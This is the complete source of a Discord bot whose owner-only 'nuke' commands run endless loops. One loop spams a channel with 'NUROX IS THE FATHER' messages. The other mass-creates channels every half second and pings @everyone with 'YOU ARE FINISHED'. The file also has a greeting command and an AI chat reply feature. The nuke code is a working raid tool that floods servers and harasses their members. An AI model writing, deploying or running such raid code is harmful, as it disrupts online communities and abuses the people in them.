import express from 'express';
import { Client, GatewayIntentBits, REST, Routes, SlashCommandBuilder } from 'discord.js';

const app = express();
app.get('/', (req, res) => res.send('Bot is Alive!'));
app.listen(3000, () => console.log('Server is active on port 3000'));

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent
  ]
});

let isNuking = false;

const BOT_TOKEN = process.env.BOT_TOKEN;
const OWNER_ID = process.env.OWNER_ID;
const GROQ_API_KEY = process.env.GROQ_API_KEY;

// GIF link
const SPECIFIC_GIF = '[.](https://klipy.com/gifs/cat-clapping-3)';

// Register Slash Commands
const commands = [
  new SlashCommandBuilder()
    .setName('nuke')
    .setDescription('Start nuke process')
    .setContexts([0, 1, 2])
    .setIntegrationTypes([0, 1]),
  new SlashCommandBuilder()
    .setName('nukeprime')
    .setDescription('Start infinite channel nuke prime process')
    .setContexts([0, 1, 2])
    .setIntegrationTypes([0, 1]),
  new SlashCommandBuilder()
    .setName('recoverprime')
    .setDescription('Delete all channels created by nuke prime')
    .setContexts([0, 1, 2])
    .setIntegrationTypes([0, 1]),
  new SlashCommandBuilder()
    .setName('stopprime')
    .setDescription('Stop nuke prime process')
    .setContexts([0, 1, 2])
    .setIntegrationTypes([0, 1]),
  new SlashCommandBuilder()
    .setName('stop')
    .setDescription('Stop nuke process')
    .setContexts([0, 1, 2])
    .setIntegrationTypes([0, 1]),
  new SlashCommandBuilder()
    .setName('greet')
    .setDescription('Greet everyone')
    .setContexts([0, 1, 2])
    .setIntegrationTypes([0, 1])
].map(cmd => cmd.toJSON());

client.on('ready', async () => {
  console.log(`Bot logged in as ${client.user.tag}!`);

  client.user.setPresence({
    activities: [{
      name: 'Custom Status',
      type: 4, 
      state: '👑 LISTENING TO NUROX' 
    }],
    status: 'online'
  });

  const rest = new REST({ version: '10' }).setToken(BOT_TOKEN);
  try {
    console.log('Registering slash commands...');
    await rest.put(
      Routes.applicationCommands(client.user.id),
      { body: commands }
    );
    console.log('Slash commands registered successfully!');
  } catch (error) {
    console.error('Error registering slash commands:', error);
  }
});

// 1. Normal Message Handler
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  const content = message.content.toLowerCase();

  if (content === 'greet') {
    await message.channel.send('> **YOO EVERYONE SUP?**');
    return;
  }

  if (content === 'nuke' || content === 'nukeprime' || content === 'recoverprime' || content === 'stopprime' || content === 'stop') {
    if (message.author.id !== OWNER_ID) {
      return message.reply('❌ You are not NUROX to use this command!');
    }
  }

  if (message.author.id === OWNER_ID) {
    if (content === 'nuke') {
      if (isNuking) {
        return message.reply('Nuke process standardly running already!');
      }
      isNuking = true;
      await message.reply('💣 Nuke Activated!');
      
      while (isNuking) {
        try {
          await message.channel.send(`> # **<a:crown_anm:1559736674941014057>NUROX IS THE FATHER**\n${SPECIFIC_GIF}`);
        } catch (err) {
          console.error('Error sending message:', err);
        }
        await new Promise(resolve => setTimeout(resolve, 2000));
      }
      return;
    }

    if (content === 'nukeprime') {
      if (!message.guild) {
        return message.reply('This command can only be used in a server!');
      }
      if (isNuking) {
        return message.reply('Nuke process already running!');
      }
      isNuking = true;
      await message.reply('💣 Nuke Prime Activated!');

      while (isNuking && message.guild) {
        try {
          const channel = await message.guild.channels.create({
            name: '👑 NUROX IS THE FATHER',
            type: 0
          });
          await channel.send('@everyone YOU ARE FINISHED');
        } catch (err) {
          console.error('Error creating channel:', err);
        }
        await new Promise(resolve => setTimeout(resolve, 500));
      }
      return;
    }

    if (content === 'recoverprime') {
      if (!message.guild) {
        return message.reply('This command can only be used in a server!');
      }
      await message.reply('🔄 Recovering Nuke Prime channels...');
      try {
        const channels = message.guild.channels.cache.filter(c => c.name.toLowerCase().includes('nurox'));
        let deletedCount = 0;
        for (const [id, channel] of channels) {
          await channel.delete().catch(err => console.error('Failed to delete channel:', err));
          deletedCount++;
        }
        await message.channel.send(`✅ Successfully deleted ${deletedCount} Nuke Prime channels!`);
      } catch (err) {
        console.error('Error recovering channels:', err);
        await message.reply('❌ Error deleting channels.');
      }
      return;
    }

    if (content === 'stopprime' || content === 'stop') {
      if (isNuking) {
        isNuking = false;
        await message.reply('🛑 Nuke Prime / Process Terminated!');
      } else {
        await message.reply('No active nuke loop is running.');
      }
      return;
    }
  }

  // AI Response Section (Independent & Smart)
  if (message.mentions.has(client.user)) {
    try {
      const promptText = message.content.replace(`<@!${client.user.id}>`, '').replace(`<@${client.user.id}>`, '').trim();
      if (!promptText) return;

      const response = await fetch("https://api.groq.com/openai/v1/chat/completions", {
        method: "POST",
        headers: {
          "Authorization": `Bearer ${GROQ_API_KEY}`,
          "Content-Type": "application/json"
        },
        body: JSON.stringify({
          "model": "openai/gpt-oss-20b",
          "messages": [
            {
              "role": "system",
              "content": "You are MAXO, an extremely cool, witty, intelligent, and helpful Discord bot created/owned by NUROX. You are completely free to express yourself naturally in whatever language or script the user talks to you in (Bengali, Banglish, English, Code, etc.). Be engaging, smart, and friendly."
            },
            {
              "role": "user",
              "content": promptText
            }
          ]
        })
      });

      const data = await response.json();
      const replyText = data.choices?.[0]?.message?.content;

      if (!replyText) {
        console.error("Groq Response Error:", data);
        return message.reply('sry,ai is in problem now.');
      }

      await message.reply(replyText);
    } catch (error) {
      console.error('AI Error:', error);
      await message.reply('ওপ্স! এআই ব্রেনের সাথে কানেক্ট করতে সমস্যা হচ্ছে।');
    }
  }
});

// 2. Slash Command Handler
client.on('interactionCreate', async (interaction) => {
  if (!interaction.isChatInputCommand()) return;

  const { commandName } = interaction;

  if (commandName === 'greet') {
    return interaction.reply({ content: '> **YOO EVERYONE SUP?**' });
  }

  if (interaction.user.id !== OWNER_ID) {
    return interaction.reply({ content: '❌ You are not NUROX to use this command!', ephemeral: true });
  }

  if (commandName === 'nuke') {
    if (isNuking) {
      return interaction.reply({ content: 'Nuke process standardly running already!', ephemeral: true });
    }

    isNuking = true;
    await interaction.reply({ content: '💣 Nuke Activated!' });
    
    while (isNuking) {
      try {
        await interaction.followUp({ content: `> # **<a:crown_anm:1559736674941014057>NUROX IS THE FATHER**\n${SPECIFIC_GIF}` });
      } catch (err) {
        console.error('Error sending followUp:', err);
        try {
          await interaction.channel.send(`> # **<a:crown_anm:1559736674941014057>NUROX IS THE FATHER**\n${SPECIFIC_GIF}`);
        } catch (e) {
          console.error('Fallback channel send error:', e);
        }
      }
      await new Promise(resolve => setTimeout(resolve, 2000));
    }
  }

  if (commandName === 'nukeprime') {
    if (!interaction.guild) {
      return interaction.reply({ content: 'This command can only be used in a server!', ephemeral: true });
    }
    if (isNuking) {
      return interaction.reply({ content: 'Nuke process already running!', ephemeral: true });
    }

    isNuking = true;
    await interaction.reply({ content: '💣 Nuke Prime Activated!' });
    
    while (isNuking && interaction.guild) {
      try {
        const channel = await interaction.guild.channels.create({
          name: '👑 NUROX IS THE FATHER',
          type: 0
        });
        await channel.send('YOU ARE FINISHED');
      } catch (err) {
        console.error('Error creating channel:', err);
      }
      await new Promise(resolve => setTimeout(resolve, 500));
    }
  }

  if (commandName === 'recoverprime') {
    if (!interaction.guild) {
      return interaction.reply({ content: 'This command can only be used in a server!', ephemeral: true });
    }

    await interaction.reply({ content: '🔄 Recovering Nuke Prime channels...', ephemeral: true });
    
    try {
      // Fetch fresh list of channels to catch all newly created ones
      await interaction.guild.channels.fetch();
      const channels = interaction.guild.channels.cache.filter(c => c.name.toLowerCase().includes('nurox'));
      let deletedCount = 0;

      for (const [id, channel] of channels) {
        await channel.delete().catch(err => console.error('Failed to delete channel:', err));
        deletedCount++;
      }

      await interaction.followUp({ content: `✅ Successfully deleted ${deletedCount} Nuke Prime channels!`, ephemeral: true });
    } catch (err) {
      console.error('Error recovering channels:', err);
      await interaction.followUp({ content: '❌ Failed to delete channels.', ephemeral: true });
    }
  }

  if (commandName === 'stopprime' || commandName === 'stop') {
    if (isNuking) {
      isNuking = false;
      await interaction.reply({ content: '🛑 Nuke Prime / Process Terminated!' });
    } else {
      await interaction.reply({ content: 'No active nuke loop is running.', ephemeral: true });
    }
  }
});

client.login(BOT_TOKEN);
